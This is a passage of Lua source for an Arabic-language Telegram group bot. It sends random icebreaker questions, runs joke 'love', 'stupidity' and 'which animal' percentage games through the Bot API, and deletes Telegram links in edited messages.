"مغني تلاحظ أن صوته يعجب الجميع إلا أنت؟ ", 
" آخر غلطات عمرك؟ ", 
" مسلسل كرتوني له ذكريات جميلة عندك؟ ", 
" ما أكثر تطبيق تقضي وقتك عليه؟ ", 
" أول شيء يخطر في بالك إذا سمعت كلمة نجوم ؟ ", 
" قدوتك من الأجيال السابقة؟ ", 
" أكثر طبع تهتم بأن يتواجد في شريك/ة حياتك؟ ", 
"أكثر حيوان تخاف منه؟ ", 
" ما هي طريقتك في الحصول على الراحة النفسية؟ ", 
" إيموجي يعبّر عن مزاجك الحالي؟ ", 
" أكثر تغيير ترغب أن تغيّره في نفسك؟ ", 
"أكثر شيء أسعدك اليوم؟ ", 
"اي رايك في الدنيا دي ؟ ", 
"ما هو أفضل حافز للشخص؟ ", 
"ما الذي يشغل بالك في الفترة الحالية؟", 
"آخر شيء ندمت عليه؟ ", 
"شاركنا صورة احترافية من تصويرك؟ ", 
"تتابع انمي؟ إذا نعم ما أفضل انمي شاهدته ", 
"يرد عليك متأخر على رسالة مهمة وبكل برود، موقفك؟ ", 
"نصيحه تبدا ب -لا- ؟ ", 
"كتاب أو رواية تقرأها هذه الأيام؟ ", 
"فيلم عالق في ذهنك لا تنساه مِن روعته؟ ", 
"يوم لا يمكنك نسيانه؟ ", 
"شعورك الحالي في جملة؟ ", 
"كلمة لشخص بعيد؟ ", 
"صفة يطلقها عليك الشخص المفضّل؟ ", 
"أغنية عالقة في ذهنك هاليومين؟ ", 
"أكلة مستحيل أن تأكلها؟ ", 
"كيف قضيت نهارك؟ ", 
"تصرُّف ماتتحمله؟ ", 
"موقف غير حياتك؟ ", 
"اكثر مشروب تحبه؟ ", 
"القصيدة اللي تأثر فيك؟ ", 
"متى يصبح الصديق غريب ", 
"وين نلقى السعاده برايك؟ ", 
"تاريخ ميلادك؟ ", 
"قهوه و لا شاي؟ ", 
"من محبّين الليل أو الصبح؟ ", 
"حيوانك المفضل؟ ", 
"كلمة غريبة ومعناها؟ ", 
"كم تحتاج من وقت لتثق بشخص؟ ", 
"اشياء نفسك تجربها؟ ", 
"يومك ضاع على؟ ", 
"كل شيء يهون الا ؟ ", 
"اسم ماتحبه ؟ ", 
"وقفة إحترام للي إخترع ؟ ", 
"أقدم شيء محتفظ فيه من صغرك؟ ", 
"كلمات ماتستغني عنها بسوالفك؟ ", 
"وش الحب بنظرك؟ ", 
"حب التملك في شخصِيـتك ولا ؟ ", 
"تخطط للمستقبل ولا ؟ ", 
"موقف محرج ماتنساه ؟ ", 
"من طلاسم لهجتكم ؟ ", 
"اعترف باي حاجه ؟ ", 
"عبّر عن مودك بصوره ؟ ",
"آخر مره ضربت عشره كانت متى ؟", 
"اسم دايم ع بالك ؟ ", 
"اشياء تفتخر انك م سويتها ؟ ", 
" لو بكيفي كان ؟ ", 
  "أكثر جملة أثرت بك في حياتك؟ ",
  "إيموجي يوصف مزاجك حاليًا؟ ",
  "أجمل اسم بنت بحرف الباء؟ ",
  "كيف هي أحوال قلبك؟ ",
  "أجمل مدينة؟ ",
  "كيف كان أسبوعك؟ ",
  "شيء تشوفه اكثر من اهلك ؟ ",
  "اخر مره فضفضت؟ ",
  "قد كرهت احد بسبب اسلوبه؟ ",
  "قد حبيت شخص وخذلك؟ ",
  "كم مره حبيت؟ ",
  "اكبر غلطة بعمرك؟ ",
  "نسبة النعاس عندك حاليًا؟ ",
  "شرايكم بمشاهير التيك توك؟ ",
  "ما الحاسة التي تريد إضافتها للحواس الخمسة؟ ",
  "اسم قريب لقلبك؟ ",
  "مشتاق لمطعم كنت تزوره قبل الحظر؟ ",
  "أول شيء يخطر في بالك إذا سمعت كلمة (ابوي يبيك)؟ ",
  "ما أول مشروع تتوقع أن تقوم بإنشائه إذا أصبحت مليونير؟ ",
  "أغنية عالقة في ذهنك هاليومين؟ ",
  "متى اخر مره قريت قرآن؟ ",
  "كم صلاة فاتتك اليوم؟ ",
  "تفضل التيكن او السنقل؟ ",
  "وش أفضل بوت برأيك؟ ",
"كم لك بالتلي؟ ",
"وش الي تفكر فيه الحين؟ ",
"كيف تشوف الجيل ذا؟ ",
"منشن شخص وقوله، تحبني؟ ",
"لو جاء شخص وعترف لك كيف ترده؟ ",
"مر عليك موقف محرج؟ ",
"وين تشوف نفسك بعد سنتين؟ ",
"لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟ ",
"وش اجمل لهجة تشوفها؟ ",
"قد سافرت؟ ",
"افضل مسلسل عندك؟ ",
"افضل فلم عندك؟ ",
"مين اكثر يخون البنات/العيال؟ ",
"متى حبيت؟ ",
  "بالعادة متى تنام؟ ",
  "شيء من صغرك ماتغير فيك؟ ",
  "شيء بسيط قادر يعدل مزاجك بشكل سريع؟ ",
  "تشوف الغيره انانيه او حب؟ ",
"حاجة تشوف نفسك مبدع فيها؟ ",
  "مع او ضد : يسقط جمال المراة بسبب قبح لسانها؟ ",
  "عمرك بكيت على شخص مات في مسلسل ؟ ",
  "‏- هل تعتقد أن هنالك من يراقبك بشغف؟ ",
  "تدوس على قلبك او كرامتك؟ ",
  "اكثر لونين تحبهم مع بعض؟ ",
  "مع او ضد : النوم افضل حل لـ مشاكل الحياة؟ ",
  "سؤال دايم تتهرب من الاجابة عليه؟ ",
  "تحبني ولاتحب الفلوس؟ ",
  "العلاقه السريه دايماً تكون حلوه؟ ",
  "لو أغمضت عينيك الآن فما هو أول شيء ستفكر به؟ ",
"كيف ينطق الطفل اسمك؟ ",
  "ما هي نقاط الضعف في شخصيتك؟ ",
  "اكثر كذبة تقولها؟ ",
  "تيكن ولا اضبطك؟ ",
  "اطول علاقة كنت فيها مع شخص؟ ",
  "قد ندمت على شخص؟ ",
  "وقت فراغك وش تسوي؟ ",
  "عندك أصحاب كثير؟ ولا ينعد بالأصابع؟ ",
  "حاط نغمة خاصة لأي شخص؟ ",
  "وش اسم شهرتك؟ ",
  "أفضل أكلة تحبه لك؟ ",
"عندك شخص تسميه ثالث والدينك؟ ",
  "عندك شخص تسميه ثالث والدينك؟ ",
  "اذا قالو لك تسافر أي مكان تبيه وتاخذ معك شخص واحد وين بتروح ومين تختار؟ ",
  "أطول مكالمة كم ساعة؟ ",
  "تحب الحياة الإلكترونية ولا الواقعية؟ ",
  "كيف حال قلبك ؟ بخير ولا مكسور؟ ",
  "أطول مدة نمت فيها كم ساعة؟ ",
  "تقدر تسيطر على ضحكتك؟ ",
  "أول حرف من اسم الحب؟ ",
  "تحب تحافظ على الذكريات ولا تمسحه؟ ",
  "اسم اخر شخص زعلك؟ ",
"وش نوع الأفلام اللي تحب تتابعه؟ ",
  "أنت انسان غامض ولا الكل يعرف عنك؟ ",
  "لو الجنسية حسب ملامحك وش بتكون جنسيتك؟ ",
  "عندك أخوان او خوات من الرضاعة؟ ",
  "إختصار تحبه؟ ",
  "إسم شخص وتحس أنه كيف؟ ",
  "وش الإسم اللي دايم تحطه بالبرامج؟ ",
  "وش برجك؟ ",
  "لو يجي عيد ميلادك تتوقع يجيك هدية؟ ",
  "اجمل هدية جاتك وش هو؟ ",
  "الصداقة ولا الحب؟ ",
"الصداقة ولا الحب؟ ",
  "الغيرة الزائدة شك؟ ولا فرط الحب؟ ",
    "هل انت دي تويت باعت باندا؟ ",
  "قد حبيت شخصين مع بعض؟ وانقفطت؟ ",
  "وش أخر شي ضيعته؟ ",
  "قد ضيعت شي ودورته ولقيته بيدك؟ ",
  "تؤمن بمقولة اللي يبيك مايحتار فيك؟ ",
  "سبب وجوك بالتليجرام؟ ",
  "تراقب شخص حاليا؟ ",
  "عندك معجبين ولا محد درا عنك؟ ",
  "لو نسبة جمالك بتكون بعدد شحن جوالك كم بتكون؟ ",
  "أنت محبوب بين الناس؟ ولاكريه؟ ",
"كم عمرك؟ ",
  "لو يسألونك وش اسم امك تجاوبهم ولا تسفل فيهم؟ ",
  "تؤمن بمقولة الصحبة تغنيك الحب؟ ",
  "وش مشروبك المفضل؟ ",
  "قد جربت الدخان بحياتك؟ وانقفطت ولا؟ ",
  "أفضل وقت للسفر؟ الليل ولا النهار؟ ",
  "انت من النوع اللي تنام بخط السفر؟ ",
  "عندك حس فكاهي ولا نفسية؟ ",
  "تبادل الكراهية بالكراهية؟ ولا تحرجه بالطيب؟ ",
  "أفضل ممارسة بالنسبة لك؟ ",
  "لو قالو لك تتخلى عن شي واحد تحبه بحياتك وش يكون؟ ",
"لو احد تركك وبعد فتره يحاول يرجعك بترجع له ولا خلاص؟ ",
  "برأيك كم العمر المناسب للزواج؟ ",
  "اذا تزوجت بعد كم بتخلف عيال؟ ",
  "فكرت وش تسمي أول اطفالك؟ ",
  "من الناس اللي تحب الهدوء ولا الإزعاج؟ ",
  "الشيلات ولا الأغاني؟ ",
  "عندكم شخص مطوع بالعايلة؟ ",
  "تتقبل النصيحة من اي شخص؟ ",
  "اذا غلطت وعرفت انك غلطان تحب تعترف ولا تجحد؟ ",
  "جربت شعور احد يحبك بس انت مو قادر تحبه؟ ",
  "دايم قوة الصداقة تكون بإيش؟ ",
"أفضل البدايات بالعلاقة بـ وش؟ ",
  "وش مشروبك المفضل؟ او قهوتك المفضلة؟ ",
  "تحب تتسوق عبر الانترنت ولا الواقع؟ ",
  "انت من الناس اللي بعد ماتشتري شي وتروح ترجعه؟ ",
  "أخر مرة بكيت متى؟ وليش؟ ",
  "عندك الشخص اللي يقلب الدنيا عشان زعلك؟ ",
  "أفضل صفة تحبه بنفسك؟ ",
  "كلمة تقولها للوالدين؟ ",
  "أنت من الناس اللي تنتقم وترد الاذى ولا تحتسب الأجر وتسامح؟ ",
  "كم عدد سنينك بالتليجرام؟ ",
  "تحب تعترف ولا تخبي؟ ",
"انت من الناس الكتومة ولا تفضفض؟ ",
  "أنت بعلاقة حب الحين؟ ",
  "عندك اصدقاء غير جنسك؟ ",
  "أغلب وقتك تكون وين؟ ",
  "لو المقصود يقرأ وش بتكتب له؟ ",
  "تحب تعبر بالكتابة ولا بالصوت؟ ",
  "عمرك كلمت فويس احد غير جنسك؟ ",
  "لو خيروك تصير مليونير ولا تتزوج الشخص اللي تحبه؟ ",
  "لو عندك فلوس وش السيارة اللي بتشتريها؟ ",
  "كم أعلى مبلغ جمعته؟ ",
  "اذا شفت احد على غلط تعلمه الصح ولا تخليه بكيفه؟ ",
"قد جربت تبكي فرح؟ وليش؟ ",
"تتوقع إنك بتتزوج اللي تحبه؟ ",
  "ما هو أمنيتك؟ ",
  "وين تشوف نفسك بعد خمس سنوات؟ ",
  "هل انت حرامي تويت بتعت باندا؟ ",
  "لو خيروك تقدم الزمن ولا ترجعه ورا؟ ",
  "لعبة قضيت وقتك فيه بالحجر المنزلي؟ ",
  "تحب تطق الميانة ولا ثقيل؟ ",
  "باقي معاك للي وعدك ما بيتركك؟ ",
  "اول ماتصحى من النوم مين تكلمه؟ ",
  "عندك الشخص اللي يكتب لك كلام كثير وانت نايم؟ ",
  "قد قابلت شخص تحبه؟ وولد ولا بنت؟ ",
   "هل انت تحب باندا؟ ",
"اذا قفطت احد تحب تفضحه ولا تستره؟ ",
  "كلمة للشخص اللي يسب ويسطر؟ ",
  "آية من القران تؤمن فيه؟ ",
  "تحب تعامل الناس بنفس المعاملة؟ ولا تكون أطيب منهم؟ ",
"حاجة ودك تغيرها هالفترة؟ ",
  "كم فلوسك حاليا وهل يكفيك ام لا؟ ",
  "وش لون عيونك الجميلة؟ ",
  "من الناس اللي تتغزل بالكل ولا بالشخص اللي تحبه بس؟ ",
  "اذكر موقف ماتنساه بعمرك؟ ",
  "وش حاب تقول للاشخاص اللي بيدخل حياتك؟ ",
  "ألطف شخص مر عليك بحياتك؟ ",
   "هل باندا لطيف؟ ",
"انت من الناس المؤدبة ولا نص نص؟ ",
  "كيف الصيد معاك هالأيام ؟ وسنارة ولاشبك؟ ",
  "لو الشخص اللي تحبه قال بدخل حساباتك بتعطيه ولا تكرشه؟ ",
  "أكثر شي تخاف منه بالحياه وش؟ ",
  "اكثر المتابعين عندك باي برنامج؟ ",
  "متى يوم ميلادك؟ ووش الهدية اللي نفسك فيه؟ ",
  "قد تمنيت شي وتحقق؟ ",
  "قلبي على قلبك مهما صار لمين تقولها؟ ",
  "وش نوع جوالك؟ واذا بتغيره وش بتأخذ؟ ",
  "كم حساب عندك بالتليجرام؟ ",
  "متى اخر مرة كذبت؟ ",
"كذبت في الاسئلة اللي مرت عليك قبل شوي؟ ",
  "تجامل الناس ولا اللي بقلبك على لسانك؟ ",
  "قد تمصلحت مع أحد وليش؟ ",
  "وين تعرفت على الشخص اللي حبيته؟ ",
  "قد رقمت او احد رقمك؟ ",
  "وش أفضل لعبته بحياتك؟ ",
  "أخر شي اكلته وش هو؟ ",
  "حزنك يبان بملامحك ولا صوتك؟ ",
  "لقيت الشخص اللي يفهمك واللي يقرا افكارك؟ ",
  "فيه شيء م تقدر تسيطر عليه ؟ ",
  "منشن شخص متحلطم م يعجبه شيء؟ ",
"اكتب تاريخ مستحيل تنساه ",
  "شيء مستحيل انك تاكله ؟ ",
  "تحب تتعرف على ناس جدد ولا مكتفي باللي عندك ؟ ",
  "انسان م تحب تتعامل معاه ابداً ؟ ",
  "شيء بسيط تحتفظ فيه؟ ",
  "فُرصه تتمنى لو أُتيحت لك ؟ ",
   "لي باندا ناك اليكس؟ ",
  "شيء مستحيل ترفضه ؟. ",
  "لو زعلت بقوة وش بيرضيك ؟ ",
  "تنام بـ اي مكان ، ولا بس غرفتك ؟ ",
  "ردك المعتاد اذا أحد ناداك ؟ ",
  "مين الي تحب يكون مبتسم دائما ؟ ",
" إحساسك في هاللحظة؟ ",
  "وش اسم اول شخص تعرفت عليه فالتلقرام ؟ ",
  "اشياء صعب تتقبلها بسرعه ؟ ",
  "شيء جميل صار لك اليوم ؟ ",
  "اذا شفت شخص يتنمر على شخص قدامك شتسوي؟ ",
  "يهمك ملابسك تكون ماركة ؟ ",
  "ردّك على شخص قال (أنا بطلع من حياتك)؟. ",
  "مين اول شخص تكلمه اذا طحت بـ مصيبة ؟ ",
  "تشارك كل شي لاهلك ولا فيه أشياء ما تتشارك؟ ",
  "كيف علاقتك مع اهلك؟ رسميات ولا ميانة؟ ",
  "عمرك ضحيت باشياء لاجل شخص م يسوى ؟ ",
"اكتب سطر من اغنية او قصيدة جا فـ بالك ؟ ",
  "شيء مهما حطيت فيه فلوس بتكون مبسوط ؟ ",
  "مشاكلك بسبب ؟ ",
  "نسبه الندم عندك للي وثقت فيهم ؟ ",
  "اول حرف من اسم شخص تقوله? بطل تفكر فيني ابي انام؟ ",
  "اكثر شيء تحس انه مات ف مجتمعنا؟ ",
  "لو صار سوء فهم بينك وبين شخص هل تحب توضحه ولا تخليه كذا  لان مالك خلق توضح ؟ ",
  "كم عددكم بالبيت؟ ",
  "عادي تتزوج من برا القبيلة؟ ",
  "أجمل شي بحياتك وش هو؟ ",
} 
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
return false
end
if text == "نسبة الحب" or text == "نسبه حب" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:lov'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_,"sendlove")
Text = '✦┇الان ارسل اسمك واسم الشخص الثاني :'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبة الحب" and database:get(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_) == "sendlove" then
num = {"😂 10","🤤 20","😢 30","😔 35","😒 75","🤩 34","😗 66","🤐 82","😪 23","😫 19","😛 55","😜 80","😲 63","😓 32","🙂 27","😎 89","😋 99","😁 98","😀 79","🤣 100","😣 8","🙄 3","😕 6","🤯 0",};
sendnum = num[math.random(#num)]
local Text = '✦┇اليك النتائج الخـاصة :\n\n✦┇نسبة الحب بيـن : *'..text..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇'..sendnum..'%',url="https://t.me/TEAM_Neverland"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
database:del(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_)
end
if text == "نسبة الكره" or text == "نسبه كره" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:krh'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_,"sendkrhe")
Text = '✦┇الان ارسل اسمك واسم الشخص الثاني :'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبة الكره" and database:get(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_) == "sendkrhe" then
num = {"😂 10","🤤 20","😢 30","😔 35","😒 75","🤩 34","😗 66","🤐 82","😪 23","?? 19","😛 55","😜 80","😲 63","😓 32","🙂 27","😎 89","😋 99","😁 98","😀 79","🤣 100","😣 8","🙄 3","😕 6","🤯 0",};
sendnum = num[math.random(#num)]
local Text = '✦┇اليك النتائج الخـاصة :\n\n✦┇نسبه الكرة : *'..text..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇'..sendnum..'%',url="https://t.me/TEAM_Neverland"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
database:del(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_)
end
if text == "نسبة الرجوله" or text == "نسبه الرجوله" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_,"sendrjoe")
Text = '✦┇الان ارسل اسم الشخص :'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبة الرجوله" and database:get(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_) == "sendrjoe" then
numj = {"😂 10","🤤 20","😢 30","😔 35","😒 75","🤩 34","😗 66","🤐 82","😪 23","😫 19","😛 55","😜 80","😲 63","😓 32","🙂 27","😎 89","😋 99","😁 98","😀 79","🤣 100","😣 8","🙄 3","😕 6","🤯 0",};
sendnuj = numj[math.random(#numj)]
local Text = '✦┇اليك النتائج الخـاصة :\n\n✦┇ نسبة الرجوله لـ : *'..text..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇'..sendnuj..'%',url="https://t.me/TEAM_Neverland"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
database:del(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_)
end
if text == "نسبة الانوثه" or text == "نسبه انوثه" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:ano'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_,"sendanoe")
Text = '✦┇الان ارسل اسم الشخص :'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبة الانوثه" and database:get(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_) == "sendanoe" then
numj = {"😂 10","🤤 20","😢 30","😔 35","😒 75","🤩 34","😗 66","🤐 82","😪 23","😫 19","😛 55","😜 80","😲 63","😓 32","🙂 27","😎 89","?? 99","😁 98","😀 79","🤣 100","😣 8","🙄 3","😕 6","🤯 0",};
sendnuj = numj[math.random(#numj)]
local Text = '✦┇اليك النتائج الخـاصة :\n\n✦┇ نسبه الانوثة لـ : *'..text..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇'..sendnuj..'%',url="https://t.me/TEAM_Neverland"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
database:del(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_)
end
if text == "كشف الحيوان" or text == "نسبه انوثه" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:ono'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":ono_Bots"..msg.chat_id_,"sendonoe")
Text = '✦┇الان ارسل اسم الشخص :'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="كشف الحيوان" and database:get(bot_id..":"..msg.sender_user_id_..":ono_Bots"..msg.chat_id_) == "sendonoe" then
numj = {"قنفذ 🦝","صخل 🐐","جلب 🦮","بقرة 🐄","خنزير 🐖","قرد 🦧","فأر 🐁","تمساح 🐊","ذبانه 🪰","حصان 🐴",};
sendnmj = numj[math.random(#numj)]
local Text = '✦┇اليك النتائج الخـاصة :\n\n✦┇ نوع الحيوان لـ : *'..text..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..sendnmj..' ‹‹-',url="https://t.me/TEAM_Neverland"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
database:del(bot_id..":"..msg.sender_user_id_..":ono_Bots"..msg.chat_id_)
end
if text == "كشف الارتباط" or text == "نسبه الارتباط" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:goo'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":goo_Bots"..msg.chat_id_,"sendonoe")
Text = '✦┇الان ارسل اسم الشخص :'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="كشف الارتباط" and database:get(bot_id..":"..msg.sender_user_id_..":goo_Bots"..msg.chat_id_) == "sendonoe" then
numj = {"مرتبط 💔😐","خاين 😊😂","ممرتبط 😗","مرتبط ب 10 🙁😂","زاحف على 4 🥰😂",};
sendnuk = numj[math.random(#numj)]
local Text = '✦┇ اليك النتائج الخـاصة :\n\n✦┇ نوع الكشف لـ : *'..text..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..sendnuk..' ‹‹-',url="https://t.me/TEAM_Neverland"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
database:del(bot_id..":"..msg.sender_user_id_..":goo_Bots"..msg.chat_id_)
end
if text == "نسبة الغباء" or text == "نسبة الغباء" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:vov'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":vov_Bots"..msg.chat_id_,"sendonoe")
Text = '✦┇الان ارسل اسم الشخص :'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبة الغباء" and database:get(bot_id..":"..msg.sender_user_id_..":vov_Bots"..msg.chat_id_) == "sendonoe" then
numj = {"😂 10","🤤 20","😢 30","😔 35","😒 75","🤩 34","?? 66","🤐 82","😪 23","😫 19","😛 55","😜 80","😲 63","😓 32","🙂 27","😎 89","😋 99","😁 98","😀 79","🤣 100","😣 8","🙄 3","?? 6","🤯 0",};
sendnnk = numj[math.random(#numj)]
local Text = '✦┇اليك النتائج الخـاصة :\n\n✦┇نسبة الغباء لـ : *'..text..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇'..sendnnk..'%',url="https://t.me/TEAM_Neverland"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
database:del(bot_id..":"..msg.sender_user_id_..":vov_Bots"..msg.chat_id_)
end
if text == "نسبة الزحف" or text == "نسبة الزحف" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:zff'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":zff_Bots"..msg.chat_id_,"sendonoe")
Text = '✦┇الان ارسل اسم الشخص :'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبة الزحف" and database:get(bot_id..":"..msg.sender_user_id_..":zff_Bots"..msg.chat_id_) == "sendonoe" then
numj = {"🤣 10","🥰 20 ","?? 30","🤔 35","😝 75","😴 34","😏 66","😕 82","?? 23","🌚😹 19","😹😔 55","😘😹 80","☹️😹 63","🌝😹 32","☺️😹 27","😍😂 89","😎😂 99","🤣 98","🌚😂 79","😔😹 100","💘🌚 8","😎 3","😔 6","☹️ 0",};
sendzff = numj[math.random(#numj)]
local Text = '✦┇اليك النتائج الخـاصة :\n\n✦┇نسبة الزحف لـ : *'..text..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇'..sendzff..'%',url="https://t.me/TEAM_Neverland"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
database:del(bot_id..":"..msg.sender_user_id_..":zff_Bots"..msg.chat_id_)
end
if text == "نسبة الخيانة" or text == "نسبة الخيانة" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:hen'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":hen_Bots"..msg.chat_id_,"sendonoe")
Text = '✦┇الان ارسل اسم الشخص :'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبة الخيانة" and database:get(bot_id..":"..msg.sender_user_id_..":hen_Bots"..msg.chat_id_) == "sendonoe" then
numj = {"👋🏻🌚 10","🌙?? 20 ","☹️ ↗️ 30","🌚😂 35","😔💔 75","👋🏻🥺 34","💔😶 66","💔😕 82","💔😭 23","💭🌝 19","🙄😂 55","😘😹 80","☹️😹 63","🌝😹 32","☺️😹 27","😍😂 89","😎😂 99","🤣 98","🌚😂 79","😔?? 100","💘?? 8","😎 3","😔 6","☹️ 0",};
sendhen = numj[math.random(#numj)]
local Text = '✦┇اليك النتائج الخـاصة :\n\n✦┇نسبة الزحف لـ : *'..text..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇'..sendhen..'%',url="https://t.me/TEAM_Neverland"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
database:del(bot_id..":"..msg.sender_user_id_..":hen_Bots"..msg.chat_id_)
end
------------------------------------------------------------------------
Neverland_Started_Bot(msg,data)
Neverland_Files(msg)
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
database:incr(bot_id..'Neverland:message_edit'..result.chat_id_..result.sender_user_id_)
local Text = result.content_.text_
if database:get(bot_id.."Neverland:Lock:edit"..msg.chat_id_) and not Text and not VIP_DeV(result) then
local list = database:smembers(bot_id.."Neverland:Sudo:User")
t = "✦┇ المنشئين الاساسين تعالو مخرب \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "ماكو منششئين يشوفولك جاره"
end
Reply_Status(result,result.sender_user_id_,"reply","✦┇قام بالتعديل على الميديا"..t)  
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
end
local text = result.content_.text_
if not VIP_DeV(result) then
------------------------------------------------------------------------
if text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."Neverland:Lock:Link"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
